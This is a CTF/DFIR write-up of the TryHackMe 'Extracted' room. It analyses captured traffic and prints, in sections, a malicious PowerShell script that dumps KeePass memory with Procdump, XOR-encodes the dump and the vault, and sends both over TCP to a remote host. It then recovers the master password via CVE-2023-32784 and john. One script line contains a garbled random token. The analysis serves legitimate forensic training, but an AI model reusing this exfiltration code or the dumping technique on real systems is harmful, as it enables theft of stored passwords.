---
title: Extracted
date: 2024-12-27
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, reverse, wireshark, pyinstaller, c2, script]     # TAG names should always be lowercase
comments: false
image: /assets/img/tryhackme/ctf/extracted/banner.png
---

> Context of this [room](https://tryhackme.com/r/room/extractedroom) : Working as a senior DFIR specialist brings a new surprise every day. Today, one of your junior colleagues raised an alarm that some suspicious traffic was generated from one of the workstations, but they couldn't figure out what was happening.
>
>Unfortunately, there was an issue with the SIEM ingesting the network traffic, but luckily, the network capture device was still working. They asked if you could look to find out what happened since you are known as The Magician around these parts.

## First Look

We start this challenge with a zip file containing a **pcapng** file that we directly open with **Wireshark**.

The first thing we see is a connection from the IP `10.10.45.95` with a **HTTP GET** request to `/xxxmmdcclxxxiv.ps1` (so a PowerShell script).

So, by following the HTTP Stream of that request, we can obtain the script which seems to be used to dump Keypass informations :

![1](/assets/img/tryhackme/ctf/extracted/1.png)

We can try to understand the script in order to know if any secrets are sent remotely :

- We can see first that the script checks if **Procdump** (from SysInternals) exists on the machine, and if not then it downloads and extracts it.

```powershell
$PRoCDumppATh = 'C:\Tools\procdump.exe'
if (-Not (Test-Path -Path $PRoCDumppATh)) {
    $ProcdUmpDOWNloADURL = 'https://download.sysinternals.com/files/Procdump.zip'
    $PrOcdUmpziPpaTH = Join-Path -Path $env:TEMP -ChildPath 'Procdump.zip'
    Invoke-WebRequest -Uri $ProcdUmpDOWNloADURL -OutFile $PrOcdUmpziPpaTH
    Expand-Archive -Path $PrOcdUmpziPpaTH -DestinationPath (Split-Path -Path $PRoCDumppATh -Parent)
    Remove-Item -Path $PrOcdUmpziPpaTH
}
```

- Once that is done, the script searches for the **KeePass** process (so the password manager process). If KeePass is installed on the machine, the script uses **Procdump** to create a memory dump file called **1337**.

```powershell
$KEEPASsPrOCesS = Get-Process -Name 'KeePass'

if ($KEEPASsPrOCesS) {
    $dESKTopPATH = [systEM.EnviROnMent]::GetFolderPath('Desktop')
    $dUmPFilEpath = Join-Path -Path $dESKTopPATH -ChildPath '1337'
    $ProcStArtiNFO = New-Object System.Diagnostics.ProcessStartInfo
    $ProcStArtiNFO.FileName = $PRoCDumppATh
    $ProcStArtiNFO.Arguments = "-accepteula -ma $($KEEPASsPrOCesS.Id) `"$dUmPFilEpath`""
    $ProcStArtiNFO.RedirectStandardOutput = $True
    $ProcStArtiNFO.RedirectStandardError = $True
    $ProcStArtiNFO.UseShellExecute = $False
    $pROC = New-Object System.Diagnostics.Process
    $pROC.StartInfo = $ProcStArtiNFO
    $pROC.Start()
}
```

- Then, with the dump file just created, the script uses **XOR operation** on its bytes with a defined key `0x41` and then converts it to Base64 encoding.

```powershell
$inPutFiLEName = '1337.dmp'
$inPUTfilEpath = Join-Path -Path $dESKTopPATH -ChildPath $inPutFiLEName
if (Test-Path -Path $inPUTfilEpath) {
    $xoRKEy = 0x41 
    $oUTPutfiLeNAMe = '539.dmp'
    $ouTputFILEPath = Join-Path -Path $dESKTopPATH -ChildPath $oUTPutfiLeNAMe
    $duMpBYtES = [sySTEm.io.fIlE]::ReadAllBytes($inPUTfilEpath)
    for ($i = 0; $i -lt $duMpBYtES.Length; $i++) {
        $duMpBYtES[$i] = $duMpBYtES[$i] -bxor $xoRKEy
    }
    $bASE64enCoDeD = [SYstem.cOnveRT]::ToBase64String($duMpBYtES)
}
```

- Finally, the encoded dump is sent to a remote server (on `0xa0a5e6a` on port `1337`) using a TCP connection.

```powershell
$sERveRIP = "0xa0a5e6a"
$SeRvERpORT = 1337
$fIlEpaTH = $ouTputFILEPath

$ClIENt = New-Object System.Net.Sockets.TcpClient
$ClIENt.Connect($sERveRIP, $SeRvERpORT)

$fILEstrEAm = [sySTEm.io.fIlE]::OpenRead($fIlEpaTH)
$nETwoRKStReAM = $ClIENt.GetStream()
$BuFFEr = New-Object byte[] 1024
while ($tRuE) {
    $byTesrEAD = $fILEstrEAm.Read($BuFFEr, 0, $BuFFEr.Length)
    if ($byTesrEAD -eq 0) { break }
    $nETwoRKStReAM.Write($BuFFEr, 0, $byTesrEAD)
}
$nETwoRKStReAM.Close()
$fILEstrEAm.Close()
$ClIENt.Close()
```

- After exfiltrating the dump, the script searches for a KeePass database file (called `Database1337.kdbx`). If found, it also applies **XOR operations** with a different key and Base64 encoding to exfiltrate it on port `1338`.

```powershell
$inPutFiLEName = 'Database1337.kdbx'
$inPUTfilEpath = Join-Path -Path $dESKTopPATH -ChildPath $inPutFiLEName
if (Test-Path -Path $inPUTfilEpath) {
    $xoRKEy = 0x42

    $oUTPutfiLeNAMe = 'Database1337'
    $ouTputFILEPath = Join-Path -Path $dESKTopPATH -ChildPath $oUTPutfiLeNAMe

    $duMpBYtES = [sySTEm.io.fIlE]::ReadAllBytes($inPUTfilEpath)
    for ($i = 0; $i -lt $duMpBYtES.Length; $i++) {
        $duMpBYtES[$i] = $duMpBYtES[$i] -bxor $xoRKEy
    }

    $bASE64enCoDeD = [SYstem.cOnveRT]::ToBase64String($duMpBYtES)

    $fILEstrEAm = [sySTEm.io.fIlE]::Create($ouTputFILEPath)
    $BYtesTowRite = [sysTEm.Text.eNcOdINg]::UTF8.$o3EEYUbWq9GC4APhq0YJKs0yAIjwljcCw5jAgmbR4ZarPxq8jeaNvBt6FWA5ILVnsAmO2zIqCtuJENYOr7r2LMP8MCKjq0qEhR5a7EzhKuVhafEyZnnLm0R0llwcvDTD36tu0Pbe5kTnvHMU81tMJmF6fsSqIVF6rA23ZB4zZpCoxLaUFaIK6Gj1tDL6uzus89sVTkEumb3zg41zgQzzRYITq1f6H5lOEic8FUYlnWPFdHSq4YV7FwIcwIUuBJoJpfdVwlcelPL1Mcb0Yr7hkRK9KJcscbEwKLfaYalivZDZHXbnCD8p1jjgPVp5UhSII7NkjMCq7221BUEDTUZONqKUV7WtKBSf1KPAECnm6YXSmS6LOK17OweylFJnzKENwcdXrukFwIyPDeQ2PX2iedBwltSgp1AAlV2Vm0AdOl0ler6ozC2bmXthJjXEi54gEL29BZLRqAFIplkyjwpf8XDdgsEZQYTfVi2v8mqJpodPy9ByThCPj9X7FJmjjUFHBUUAit68cRdbr2kDUjT7uiWac0eNNEw7uUGc36rULO8RwF25W6zJYT9fK6HTjG073LILvwwTjM20b9Qg4EhAVld6SBlodCTqYKHatqncBKVvdWVnb7l20Bvs4UvZpN6nhQT0xmlp6Qh3JFzJuJtHD45nB0Kx9frRj0zD7RB0M3eQybPJt0bE0mTzU4fK($bASE64enCoDeD)
    $fILEstrEAm.Write($BYtesTowRite, 0, $BYtesTowRite.Length)
    $fILEstrEAm.Close()


    $sERveRIP = "0xa0a5e6a"
    $SeRvERpORT = 1338

    $fIlEpaTH = $ouTputFILEPath

    try {
        $ClIENt = New-Object System.Net.Sockets.TcpClient
        $ClIENt.Connect($sERveRIP, $SeRvERpORT)

        $fILEstrEAm = [sySTEm.io.fIlE]::OpenRead($fIlEpaTH)

        $nETwoRKStReAM = $ClIENt.GetStream()

        $BuFFEr = New-Object byte[] 1024  

        while ($tRuE) {
            $byTesrEAD = $fILEstrEAm.Read($BuFFEr, 0, $BuFFEr.Length)
            if ($byTesrEAD -eq 0) {
                break
            }

            $nETwoRKStReAM.Write($BuFFEr, 0, $byTesrEAD)
        }

        $nETwoRKStReAM.Close()
        $fILEstrEAm.Close()
    [...]
    }
```

## Extracting Data

Now that we know how the script works, we can quickly conclude that the packets of data transferred that we see on Wireshark are encoded thanks to this script :

![2](/assets/img/tryhackme/ctf/extracted/2.png)

We can extract the data using tshark for a faster way :

```shell
tshark -r traffic.pcapng  -T fields -e data -Y "tcp.dstport == 1337" > processdump.txt
# Sur le port 1337 pour le dump du process

tshark -r traffic.pcapng  -T fields -e data -Y "tcp.dstport == 1338" > databasedump.txt
# Sur le port 1338 pour celui de la database
```

So now, thanks to the original script, we can create our own script to decrypt the data intercepted, first, on port `1337` and second, on port `1338` using the respective XOR keys :

```python
import base64
import binascii

# XOR decoding function
def xor_decode(data, key):
    """Decode a byte array using XOR with a single-byte key."""
    return bytes([b ^ key for b in data])

# Function to fix Base64 padding
def fix_base64_padding(encoded_data):
    """Ensure the Base64 string is correctly padded to be a multiple of 4."""
    encoded_data = ''.join(c for c in encoded_data if c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
    missing_padding = len(encoded_data) % 4
    if missing_padding != 0:
        encoded_data += '=' * (4 - missing_padding)
    return encoded_data

# Function to convert hex data to binary data
def hex_to_bin(hex_data):
    """Convert a string of hexadecimal data into binary data."""
    try:
        binary_data = binascii.unhexlify(hex_data)
        return binary_data
    except binascii.Error as e:
        print(f"Error converting hex to binary: {e}")
        raise

# Function to process and decode the data using the process XOR key (0x41)
def process_data_chunk(file_path, chunk_size=1024*1024):  # 1MB chunk size
    with open(file_path, 'r') as file:
        # Read and clean the input file
        raw_data = file.read().strip()
        raw_data = raw_data.replace('\n', '').replace('\r', '')  # Remove any newline or space characters

        # Determine if the data is hexadecimal and convert to binary if necessary
        if all(c in '0123456789abcdefABCDEF' for c in raw_data):
            print("Detected hex-encoded data. Converting to binary.")
            binary_data = hex_to_bin(raw_data)
        else:
            print("Detected Base64-encoded data.")
            binary_data = raw_data  # If not hex, assume it's Base64 encoded data

        # Fix Base64 padding and decode Base64
        base64_encoded_data = fix_base64_padding(binary_data.decode('utf-8'))
        total_len = len(base64_encoded_data)
        print(f"Total Base64-encoded data length: {total_len} bytes.")

        # Open the output file for writing
        with open("decoded_process_dump_data.bin", "wb") as output_file:
            # Loop through the file in chunks to avoid memory overload
            for i in range(0, total_len, chunk_size):
                chunk = base64_encoded_data[i:i + chunk_size]
                xor_encoded_data = base64.b64decode(chunk)
                print(f"Base64 decoded chunk. Length: {len(xor_encoded_data)} bytes.")

                # Decode with the process key (0x41)
                decoded_process = xor_decode(xor_encoded_data, 0x41)
                output_file.write(decoded_process)
                print(f"Saved decoded data with process key for chunk starting at position {i}.")

        print("Decoding complete. All data written to 'decoded_process_dump_data.bin'.")

# Main execution block
try:
    # Specify the input file with the mixed Base64/hex-encoded data
    encoded_file = "processdump.txt"
    process_data_chunk(encoded_file)

except Exception as e:
    print(f"An error occurred: {e}")
```

Using this script, we get `decoded_process_dump_data.bin` and `decoded_database_data.bin` files as output, and thanks to the `file` command, we confirm that we extracted a **dump of the memory** and a **KDBX** file :

```shell
file decoded_process_dump_data.bin
decoded_process_dump_data.bin: Mini DuMP crash report, 18 streams, Tue Aug 29 02:29:23 2023, 0x461826 type

file decoded_database_data.bin
decoded_database_data.bin: Keepass password database 2.x KDBX
```

Then, when we try to access the kdbx file using keepassxc (with this command : `keepassxc decoded_database_data.bin`), we are shown a new window asking for a password :

![3](/assets/img/tryhackme/ctf/extracted/3.png)

## Recovering Password

So I guess we will have to search in the process dump to try to find any password for opening this vault.

By doing some researches, we find a vulnerability (**CVE-2023-32784**) with a [PoC for us to use](https://github.com/vdohney/keepass-password-dumper?tab=readme-ov-file) (we must make sure that we have .NET 7.0 version for it to work).

Using this on the memory dump file we decoded, we can find some characters of the password :

```shell
dotnet run ../process/decoded_process_dump_data.bin
Found: ●N
Found: ●N
Found: ●N
Found: ●N
Found: ●N
Found: ●N
Found: ●N
Found: ●N
Found: ●N
Found: ●N
Found: ●●o
Found: ●●o
Found: ●●o
Found: ●●o
Found: ●●o
Found: ●●o
Found: ●●o
Found: ●●o
Found: ●●o
Found: ●●o
Found: ●●●W
Found: ●●●W
Found: ●●●W
Found: ●●●W
Found: ●●●W
Found: ●●●W
Found: ●●●W
Found: ●●●W
Found: ●●●W
Found: ●●●W
Found: ●●●●a

[...]

Found: ●●●●●●●●●●●●●●●●●●●●●●3
Found: ●●●●●●●●●●●●●●●●●●●●●●3
Found: ●●●●●●●●●●●●●●●●●●●●●●3
Found: ●●●●●●●●●●●●●●●●●●●●●●3
Found: ●●●●●●●●●●●●●●●●●●●●●●3
Found: ●●●●●●●●●●●●●●●●●●●●●●3
Found: ●Ú
Found: ●
Found: ●]
Found: ●a
Found: ●^
Found: ●F
Found: ●5
Found: ●8
Found: ●9
Found: ●.
Found: ●,
Found: ●?
Found: ●8

Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     N, Ú, , ], a, ^, F, 5, 8, 9, ., ,, ?,
3.:     o,
4.:     W,
5.:     a,
6.:     [REDACTED],
7.:     [REDACTED],
8.:     [REDACTED],
9.:     [REDACTED],
10.:    [REDACTED],
11.:    [REDACTED],
12.:    [REDACTED],
13.:    [REDACTED],
14.:    [REDACTED],
15.:    [REDACTED],
16.:    [REDACTED],
17.:    [REDACTED],
18.:    [REDACTED],
19.:    [REDACTED],
20.:    [REDACTED],
21.:    [REDACTED],
22.:    [REDACTED],
23.:    3,
Combined: ●{N, Ú, , ], a, ^, F, 5, 8, 9, ., ,, ?}oWa[REDACTED]3
```

We already have almost all the characters except for the first one so we do not get the whole password unfortunately (the ● symbols represent the characters that the program couldn’t find). However, we can answer the first question with the initial password.

In order to find the first character, we can create a **wordlist** with the different possible combinations using **JohnTheRipper** (by using the `?a` parameter to replace with any character (upper & lower case letters, numbers, special characters)) :

```shell
john --mask='?aNoWa[REDACTED]3' --stdout > wordlist.txt
```

Now that we have our wordlist, we can first extract the **hash of the kdbx file** using **keepass2john** and then **crack the hash** using our wordlist with **john** to obtain the password to access the password manager :

```shell
keepass2john decoded_database_data.bin > hash.txt

cat hash.txt
decoded_database_data.bin:$keepass$*2*60000*0*3909e[REDACTED]999c6ad1*c23ecbbd379af0e1e680a1f90b8d51f7b018d3b053f00d06a9cdf2abc978037f*18c34bfb2b47c57ceedc0e0371db6240*ade7d7118bc18bfed4df7707a92043167c8fca1e532acdb569f51e01817db37a*2b47519844d1e750451d1a4814f1a31b089572d9b1cc6d7a2ce15a2a3bee5ca1

john --wordlist=wordlist.txt --format=keePass hash.txt
```

![4](/assets/img/tryhackme/ctf/extracted/4.png)

Once we enter the password, we access the password manager and retrieve the last flag !

![5](/assets/img/tryhackme/ctf/extracted/5.png)